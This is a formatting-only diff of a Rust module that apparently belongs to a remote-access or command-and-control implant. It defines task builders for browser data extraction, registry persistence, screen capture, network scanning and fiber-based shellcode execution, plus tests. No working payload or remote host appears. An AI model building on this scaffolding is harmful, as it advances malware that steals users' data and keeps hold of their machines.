@@ -1,5 +1,5 @@
-use serde::{Deserialize, Serialize};
 use crate::{current_timestamp, generate_uuid};
+use serde::{Deserialize, Serialize};
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Task {
@@ -340,33 +340,35 @@ impl TaskBuilder {
     }
 
     pub fn process_list() -> Task {
-        Task::new(TaskType::ProcessList)
-            .with_timeout(30)
+        Task::new(TaskType::ProcessList).with_timeout(30)
     }
 
     pub fn system_info() -> Task {
-        Task::new(TaskType::SystemInfo)
-            .with_timeout(60)
+        Task::new(TaskType::SystemInfo).with_timeout(60)
     }
 
     pub fn network_info() -> Task {
-        Task::new(TaskType::NetworkInfo)
-            .with_timeout(30)
+        Task::new(TaskType::NetworkInfo).with_timeout(30)
     }
 
     pub fn registry_query(key_path: String, value_name: Option<String>) -> Task {
         let mut task = Task::new(TaskType::RegistryQuery)
             .with_parameter("key_path".to_string(), key_path)
             .with_timeout(30);
-        
+
         if let Some(value) = value_name {
             task = task.with_parameter("value_name".to_string(), value);
         }
-        
+
         task
     }
 
-    pub fn registry_set(key_path: String, value_name: String, value_data: String, value_type: String) -> Task {
+    pub fn registry_set(
+        key_path: String,
+        value_name: String,
+        value_data: String,
+        value_type: String,
+    ) -> Task {
         Task::new(TaskType::RegistrySet)
             .with_parameter("key_path".to_string(), key_path)
             .with_parameter("value_name".to_string(), value_name)
@@ -376,8 +378,7 @@ impl TaskBuilder {
     }
 
     pub fn screen_capture() -> Task {
-        Task::new(TaskType::ScreenCapture)
-            .with_timeout(30)
+        Task::new(TaskType::ScreenCapture).with_timeout(30)
     }
 
     pub fn network_scan(target_range: String, ports: String) -> Task {
@@ -394,11 +395,14 @@ impl TaskBuilder {
     }
 
     pub fn browser_data_extraction() -> Task {
-        Task::new(TaskType::BrowserDataExtraction)
-            .with_timeout(180)
+        Task::new(TaskType::BrowserDataExtraction).with_timeout(180)
     }
 
-    pub fn registry_persistence(key_path: String, value_name: String, executable_path: String) -> Task {
+    pub fn registry_persistence(
+        key_path: String,
+        value_name: String,
+        executable_path: String,
+    ) -> Task {
         Task::new(TaskType::RegistryPersistence)
             .with_parameter("key_path".to_string(), key_path)
             .with_parameter("value_name".to_string(), value_name)
@@ -469,8 +473,8 @@ mod tests {
         let task = Task::new(TaskType::ShellCommand);
         assert!(task.is_ready_to_execute());
 
-        let future_task = Task::new(TaskType::ShellCommand)
-            .schedule_for(current_timestamp() + 3600);
+        let future_task =
+            Task::new(TaskType::ShellCommand).schedule_for(current_timestamp() + 3600);
         assert!(!future_task.is_ready_to_execute());
     }
 
@@ -490,8 +494,14 @@ mod tests {
     fn test_fiber_shellcode_task() {
         let task = TaskBuilder::fiber_shellcode("base64_shellcode".to_string());
         assert_eq!(task.task_type, TaskType::FiberShellcode);
-        assert_eq!(task.get_parameter("shellcode"), Some(&"base64_shellcode".to_string()));
-        assert_eq!(task.get_parameter("method"), Some(&"direct_fiber".to_string()));
+        assert_eq!(
+            task.get_parameter("shellcode"),
+            Some(&"base64_shellcode".to_string())
+        );
+        assert_eq!(
+            task.get_parameter("method"),
+            Some(&"direct_fiber".to_string())
+        );
         assert_eq!(task.priority, 200);
     }
 }
